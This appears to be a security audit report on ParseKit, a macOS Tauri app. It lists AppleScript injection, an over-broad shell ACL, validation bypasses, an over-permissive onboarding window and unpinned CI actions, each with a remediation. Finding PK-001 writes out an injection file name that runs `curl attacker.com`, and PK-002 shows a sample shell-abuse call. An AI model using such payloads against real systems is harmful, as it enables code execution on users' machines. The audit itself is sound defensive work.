## Findings

### [HIGH] PK-001: AppleScript injection in Finder Quick Action trash fallback

**Confidence:** 8/10  
**Phase:** Phase 9 — OWASP A05 Injection  
**Category:** Command / script injection  
**Location:** `src-tauri/resources/macos/open-with-parsekit.sh:156-164`

**Description:**  
When "Replace Original" is enabled and the CLI trash path is unavailable, file deletion uses `osascript` with the file path interpolated into an AppleScript string. Escaping only handles `\` and `"` via Python string replacement — insufficient for AppleScript string semantics.

**Exploit Scenario:**
1. Attacker creates a file with a malicious name containing `"` and AppleScript operators (e.g. `evil" & do shell script "curl attacker.com" & "x`).
2. Victim selects the file in Finder and runs the ParseKit Quick Action with Replace Original enabled.
3. `trash_original()` builds an AppleScript command with the unsafely embedded path.
4. AppleScript executes attacker-controlled commands with the user's permissions.

**Evidence:**
```python
escaped = path.replace("\\", "\\\\").replace('"', '\\"')
result = subprocess.run(
    ["osascript", "-e",
     f'tell application "Finder" to delete POSIX file "{escaped}"'],
    check=False,
)
```

**Remediation:**  
Avoid `osascript` string interpolation. Prefer the existing `parsekit-cli trash` path, or pass paths via `subprocess` argv to a small Swift/Rust helper, or use `NSURL`/`POSIX file` via `osascript -l JavaScript` with proper JSON encoding.

**Priority:** P0

### [MEDIUM] PK-002: Shell ACL grants unvalidated `open` with arbitrary arguments

**Confidence:** 9/10  
**Phase:** Phase 1 — Attack Surface / Phase 9 A02  
**Category:** Security misconfiguration  
**Location:** `src-tauri/capabilities/default.json:19-31`, `src/App.svelte:863-864`, `src/components/DependencyPreflight.svelte:107`, `src/components/AboutScreen.svelte:30`

**Description:**  
The default capability allows the webview to spawn macOS `open` with **any** arguments (`"args": true`). Rust-side `validate_user_path()` gates only the `open_in_finder` IPC command, not shell-plugin invocations. Frontend code can open arbitrary URLs, applications, or files without canonical path validation.

**Exploit Scenario:**
1. Attacker compromises the frontend bundle (supply chain) or achieves XSS despite CSP.
2. Attacker calls `Command.create("open", ["-a", "Terminal", "--args", "malicious"])` or `Command.create("open", ["https://phishing.site"])`.
3. Action executes outside Rust validation, bypassing `validate_user_path`.

**Evidence:**
```json
{ "name": "open", "cmd": "open", "args": true }
```
```typescript
await Command.create("open", [path]).spawn(); // App.svelte fallback — no validation
```

**Remediation:**
- Remove `open` from shell ACL; route **all** external opens through a single Rust IPC command that validates paths/URLs against an allowlist.
- If shell `open` is required for URLs, add `open_external_url(url: String)` IPC with `https?://` allowlist and block `file://` unless validated.
- Narrow capabilities per window (onboarding vs main).

**Priority:** P1

### [MEDIUM] PK-003: `openFolder` fallback bypasses `validate_user_path`

**Confidence:** 8/10  
**Phase:** Phase 9 — OWASP A05  
**Category:** Validation bypass  
**Location:** `src/App.svelte:859-865`

**Description:**  
`open_in_finder` in `lib.rs` correctly canonicalizes paths and rejects control characters before calling `open`. The frontend `openFolder()` helper falls back to the shell plugin with the **raw** path when IPC fails, skipping all Rust validation.

**Exploit Scenario:**
1. Malicious or malformed `outputDir` is stored in `settings.json` (another app with user-level access, or user paste).
2. User clicks "Open output folder."
3. If `open_in_finder` rejects the path, fallback runs `open` with the unvalidated string (including possible `http://` URLs or non-existent paths macOS may interpret differently).

**Evidence:**
```typescript
async function openFolder(path: string) {
  try {
    await invoke("open_in_finder", { path });
  } catch {
    const { Command } = await import("@tauri-apps/plugin-shell");
    await Command.create("open", [path]).spawn();
  }
}
```

**Remediation:** Remove the shell fallback; surface the IPC error to the user. If a fallback is needed, duplicate validation in Rust via a shared helper or second IPC.

**Priority:** P1

### [MEDIUM] PK-004: Onboarding window shares full IPC/shell surface

**Confidence:** 8/10  
**Phase:** Phase 1 — Attack Surface  
**Category:** Insecure design / defense-in-depth  
**Location:** `src-tauri/capabilities/default.json:4`, `src/components/OnboardingScreen.svelte:84`, `src/OnboardingApp.svelte`

**Description:**  
The onboarding webview (900×600, decorated, not always-on-top) receives the same `default` capability set as the main popover — including shell spawn, updater, clipboard, global shortcuts, and all IPC commands. Onboarding also calls `window.open()` for external GitHub documentation without a navigation allowlist.

**Exploit Scenario:**
1. Any future XSS or compromised frontend chunk affects onboarding equally to main UI.
2. Attacker invokes full IPC (`install_update`, `set_launch_at_login`, shell `open`, etc.) from the larger, more visible onboarding window.
3. `window.open` can direct users to phishing pages mimicking ParseKit install steps.

**Evidence:**
```json
"windows": ["main", "onboarding", "progress-hud"]
```
```typescript
window.open(INSTALL_DOCS_URL, "_blank", "noopener,noreferrer");
```

**Remediation:**
- Create `capabilities/onboarding.json` with minimal permissions (settings read/write, `copy_text_to_clipboard`, `open_in_finder` for `/Applications` only).
- Replace `window.open` with a Rust `open_external_url` command restricted to `https://github.com/harshabala/parsekit/*`.

**Priority:** P2

---

### [MEDIUM] PK-005: CI/CD Actions use mutable version tags

**Confidence:** 8/10  
**Phase:** Phase 4 — CI/CD Pipeline Security  
**Category:** Supply chain (A03)  
**Location:** `.github/workflows/release.yml:22-29`, `.github/workflows/ci.yml:13-20`

**Description:**  
GitHub Actions (`actions/checkout@v4`, `actions/setup-node@v4`, `dtolnay/rust-toolchain@stable`) are referenced by mutable tags/branches, not immutable commit SHAs. A compromised action release could affect release builds that handle `TAURI_SIGNING_PRIVATE_KEY`.

**Exploit Scenario:**
1. Attacker compromises an action at `@v4` (or `stable` toolchain redirect).
2. Release workflow exfiltrates signing key from `secrets.TAURI_SIGNING_PRIVATE_KEY`.
3. Attacker signs malicious updater artifacts accepted by embedded pubkey.

**Remediation:** Pin all `uses:` references to full commit SHAs; enable GitHub Actions allowlist / OIDC where possible.

**Priority:** P2

## Verified Safe (User Focus Areas)

### `open_in_finder` — NOT vulnerable (command injection)

**Confidence:** 9/10  
`open_in_finder` uses `validate_user_path()` (canonicalize, reject null/control chars) and passes the result as a single argument to `open` without a shell (`lib.rs:388-398`, `1063-1069`). **No command injection** on this path.

### `gatekeeper_fix_command` — NOT executed by app

**Confidence:** 10/10  
Returns a static string for user copy/paste into Terminal (`lib.rs:779-781`). The app does not execute `xattr` commands. **No injection surface** in-app.

### Secrets in repository — CLEAN

**Confidence:** 10/10  
- No `.env` files in tree  
- No `*.key` / private key material committed  
- `.gitignore` covers `.env`, `.tauri/`, `*.key`, `parsekit.key`  
- `git grep` found no live API key patterns  
- Updater pubkey in `tauri.conf.json` is public by design

### Tauri CSP — Adequate baseline, minor hardening possible

**Confidence:** 9/10 (assessment, not a gated finding)  
`tauri.conf.json:62` — `script-src 'self'` blocks external script. `style-src 'unsafe-inline'` is typical for Svelte (low-risk style injection only). Updater uses Rust plugin, not webview `connect-src`. No action required at daily gate; consider tightening if inline styles are refactored.

### DMG build scripts — Build-time only, no runtime exposure

**Confidence:** 9/10  
`scripts/dmg/build-dmg.sh` uses controlled inputs, `mktemp` staging, `ditto`, and validates PNG dimensions. `create-dmg.sh` AppleScript runs at **build** time with builder-controlled volume names. Not reported as user-runtime vulnerabilities.
